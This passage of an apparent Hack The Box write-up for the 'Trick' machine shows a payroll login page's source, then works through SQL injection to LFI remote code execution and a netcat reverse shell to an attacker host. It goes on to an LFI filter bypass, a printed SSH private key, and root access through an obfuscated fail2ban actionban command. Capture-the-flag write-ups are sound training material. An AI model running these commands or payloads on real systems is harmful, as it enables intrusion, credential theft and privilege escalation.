+<span class="cp">&lt;?php include(&#39;./db_connect.php&#39;); ?&gt;</span>
+<span class="cp">&lt;?php </span>
+<span class="cp">session_start();</span>
+<span class="cp">if(isset($_SESSION[&#39;login_id&#39;]))</span>
+<span class="cp">header(&quot;location:index.php?page=home&quot;);</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span><span class="w"></span>
+<span class="w">    </span><span class="nt">body</span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="c">/*background: #007bff;*/</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="nt">main</span><span class="p">#</span><span class="nn">main</span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">background</span><span class="p">:</span><span class="kc">white</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">#</span><span class="nn">login-right</span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">right</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="mi">40</span><span class="kt">%</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">background</span><span class="p">:</span><span class="kc">white</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">flex</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">align-items</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">#</span><span class="nn">login-left</span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">left</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">width</span><span class="p">:</span><span class="mi">60</span><span class="kt">%</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">background</span><span class="p">:</span><span class="mh">#59b6ec</span><span class="mi">61</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">flex</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">align-items</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="sx">assets/img/payroll-cover.jpg</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">background-repeat</span><span class="p">:</span><span class="w"> </span><span class="kc">no-repeat</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">background-size</span><span class="p">:</span><span class="w"> </span><span class="kc">cover</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">#</span><span class="nn">login-right</span><span class="w"> </span><span class="p">.</span><span class="nc">card</span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="kc">auto</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="k">z-index</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">.</span><span class="nc">logo</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="kc">auto</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">font-size</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="kt">rem</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="kc">white</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mf">.5</span><span class="kt">em</span><span class="w"> </span><span class="mf">0.7</span><span class="kt">em</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span><span class="kt">%</span><span class="w"> </span><span class="mi">50</span><span class="kt">%</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#000000</span><span class="n">b3</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">z-index</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="nt">div</span><span class="p">#</span><span class="nn">login-right</span><span class="p">::</span><span class="nd">before</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">content</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">top</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">left</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">height</span><span class="p">:</span><span class="w"> </span><span class="nb">calc</span><span class="p">(</span><span class="mi">100</span><span class="kt">%</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">background</span><span class="p">:</span><span class="w"> </span><span class="mh">#9fa3a7</span><span class="n">e0</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+
+
+  <span class="p">&lt;</span><span class="nt">main</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;main&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot; bg-dark&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;login-left&quot;</span><span class="p">&gt;</span>
+
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;login-right&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;card col-md-8&quot;</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;card-body&quot;</span><span class="p">&gt;</span>
+
+                    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;login-form&quot;</span> <span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;control-label&quot;</span><span class="p">&gt;</span>Username<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span><span class="p">&gt;</span>
+                        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;control-label&quot;</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span><span class="p">&gt;</span>
+                        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;btn-sm btn-block btn-wave col-md-4 btn-primary&quot;</span><span class="p">&gt;</span>Login<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+                    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+
+  <span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;back-to-top&quot;</span><span class="p">&gt;&lt;</span><span class="nt">i</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;icofont-simple-up&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+
+
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w"></span>
+<span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#login-form&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="w"></span>
+<span class="w">        </span><span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">()</span><span class="w"></span>
+<span class="w">        </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#login-form button[type=&quot;button&quot;]&#39;</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="s1">&#39;disabled&#39;</span><span class="p">,</span><span class="kc">true</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;Logging in...&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;.alert-danger&#39;</span><span class="p">).</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="p">)</span><span class="w"></span>
+<span class="w">            </span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;.alert-danger&#39;</span><span class="p">).</span><span class="nx">remove</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span><span class="w"></span>
+<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="s1">&#39;ajax.php?action=login&#39;</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(),</span><span class="w"></span>
+<span class="w">            </span><span class="nx">error</span><span class="o">:</span><span class="nx">err</span><span class="p">=&gt;{</span><span class="w"></span>
+<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#login-form button[type=&quot;button&quot;]&#39;</span><span class="p">).</span><span class="nx">removeAttr</span><span class="p">(</span><span class="s1">&#39;disabled&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;Login&#39;</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">            </span><span class="p">},</span><span class="w"></span>
+<span class="w">            </span><span class="nx">success</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">resp</span><span class="p">){</span><span class="w"></span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="nx">resp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">1</span><span class="p">){</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;index.php?page=home&#39;</span><span class="p">;</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nx">resp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">2</span><span class="p">){</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;voting.php&#39;</span><span class="p">;</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#login-form&#39;</span><span class="p">).</span><span class="nx">prepend</span><span class="p">(</span><span class="s1">&#39;&lt;div class=&quot;alert alert-danger&quot;&gt;Username or password is incorrect.&lt;/div&gt;&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#login-form button[type=&quot;button&quot;]&#39;</span><span class="p">).</span><span class="nx">removeAttr</span><span class="p">(</span><span class="s1">&#39;disabled&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;Login&#39;</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="p">})</span><span class="w"></span>
+<span class="w">    </span><span class="p">})</span><span class="w"></span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>   
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Ok, I can read files using SQL injection and I can read files using Local File inclusion, but maybe I can gain RCE using the PHP File Inclusion. I use the SQL injection to write a simple PHP file to <code>/tmp/</code> and then include it using the LFI.</p>
+<div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.8       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.8:4444
+</code></pre></div>
+
+<p>I trigger the reverse shell using the PHP LFI RCE</p>
+<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=nc 10.10.14.8 4444 -e /usr/bin/bash&#39;</span> --silent
+</code></pre></div>
+
+<p>Shortly after msfconsole received the connection</p>
+<div class="highlight"><pre><span></span><code>[*] Command shell session 2 opened (10.10.14.8:4444 -&gt; 10.10.11.166:42224) at 2022-06-26 08:27:25 +0200
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+^Z
+Background session 2? [y/N]  y
+msf6 exploit(multi/handler) &gt; search shell_to
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+
+msf6 exploit(multi/handler) &gt; use 0
+msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 2
+SESSION =&gt; 2
+msf6 post(multi/manage/shell_to_meterpreter) &gt; run
+
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.14.8:4433
+[*] Sending stage (989032 bytes) to 10.10.11.166
+[*] Meterpreter session 3 opened (10.10.14.8:4433 -&gt; 10.10.11.166:44914) at 2022-06-26 08:28:03 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter &gt; sysinfo
+Computer     : 10.10.11.166
+OS           : Debian 10.12 (Linux 4.19.0-20-amd64)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter &gt; getuid
+Server username: www-data
+
+meterpreter &gt; ls
+Listing: /var/www
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040755/rwxr-xr-x  4096  dir   2022-05-25 13:28:33 +0200  html
+040755/rwxr-xr-x  4096  dir   2022-05-25 13:28:34 +0200  market
+040755/rwxr-xr-x  4096  dir   2022-05-25 13:28:33 +0200  payroll
+
+meterpreter &gt; cd market/
+meterpreter &gt; pwd
+/var/www/market
+meterpreter &gt; cat index.php
+&lt;?php
+$file = $_GET[&#39;page&#39;];
+
+if(!isset($file) || ($file==&quot;index.php&quot;)) {
+   include(&quot;/var/www/market/home.html&quot;);
+}
+else{
+        include(&quot;/var/www/market/&quot;.str_replace(&quot;../&quot;,&quot;&quot;,$file));
+}
+?&gt;
+</code></pre></div>
+
+<p>Clearly, this is another LFI. Let's give it a try and see what user I am by executing <code>id</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl <span class="s2">&quot;preprod-marketing.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=id&quot;</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
+</code></pre></div>
+
+<p>Ok, I am <code>www-data</code> anymore, but user <code>michael</code> instead. Fast forward, by using the new LFI/RCE I walk through the filesystem and find michael's private SSH key.</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl preprod-marketing.trick.htb/index.php?page<span class="o">=</span>....//....//....//home/michael/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
++93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+<span class="nv">IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ</span><span class="o">==</span>
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div>
+
+<p>With that key, I can connect using SSH. Noteable the user can use sudo to restart fail2ban and is part of the security group which can write to the <code>/etc/fail2ban/action.d/</code> directory.</p>
+<div class="highlight"><pre><span></span><code>ssh -i id_rsa_michael michael@<span class="nv">$TIP</span>
+Linux trick <span class="m">4</span>.19.0-20-amd64 <span class="c1">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for</span> each program are described <span class="k">in</span> the
+individual files <span class="k">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+michael@trick:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> michael on trick:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User michael may run the following commands on trick:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /etc/init.d/fail2ban restart
+michael@trick:~$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
+michael@trick:~$ ls -la /etc/fail2ban/action.d
+total <span class="m">288</span>
+drwxrwx--- <span class="m">2</span> root security  <span class="m">4096</span> Jun <span class="m">13</span> <span class="m">19</span>:57 .
+drwxr-xr-x <span class="m">6</span> root root      <span class="m">4096</span> Jun <span class="m">13</span> <span class="m">19</span>:57 ..
+-rw-r--r-- <span class="m">1</span> root root      <span class="m">3879</span> Jun <span class="m">13</span> <span class="m">19</span>:57 abuseipdb.conf
+...
+</code></pre></div>
+
+<p>I can't edit the files in <code>action.d</code> in place, but copy, edit, overwrite/delete. By inserting an own <code>actionban</code> command, I can execute commands as <code>root</code> user.
+With the python script below, I read the <code>/root/root.txt</code> flag and create a server listening on port 35345, printing back the flag to the first client.</p>
+<div class="highlight"><pre><span></span><code># Option:  actioncheck
+# Notes.:  command executed once before each actionban command
+# Values:  CMD
+#
+actioncheck = &lt;iptables&gt; -n -L &lt;chain&gt; | grep -q &#39;f2b-&lt;name&gt;[ \t]&#39;
+
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = python3 -c &#39;exec(&quot;\nimport socket\nd=lambda istr: bytes.fromhex(hex(istr)[2:]).decode()\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((d(13561583350328880),35345))\ns.listen(5)\nc,a=s.accept()\nc.sendall(open(d(962339749473780545853982382520436), d(29282)).read())\n&quot;)&#39;
+</code></pre></div>
+
+<p>The editing and applying works like this:</p>
+<div class="highlight"><pre><span></span><code>cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/im.conf.tmp
+# vim /tmp/im.conf.tmp
+sed -i &quot;s/&lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/python \-c &#39;exec\(\&quot;\\\nimport socket\\\nd\=lambda istr\: bytes\.fromhex\(hex\(istr\)\[2\:\]\)\.decode\(\)\\\ns\=socket\.socket\(socket\.AF_INET,socket\.SOCK_STREAM\)\\\ns\.setsockopt\(socket\.SOL_SOCKET, socket\.SO_REUSEADDR, 1\)\\\ns\.bind\(\(d\(13561583350328880\),35345\)\)\\\ns\.listen\(5\)\\\nc,a\=s\.accept\(\)\\\nc\.sendall\(open\(d\(962339749473780545853982382520436\), d\(29282\)\)\.read\(\)\)\\\n\&quot;\)&#39;/g&quot; /tmp/im.conf.tmp
+cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf
+sudo /etc/init.d/fail2ban restart
+</code></pre></div>
+
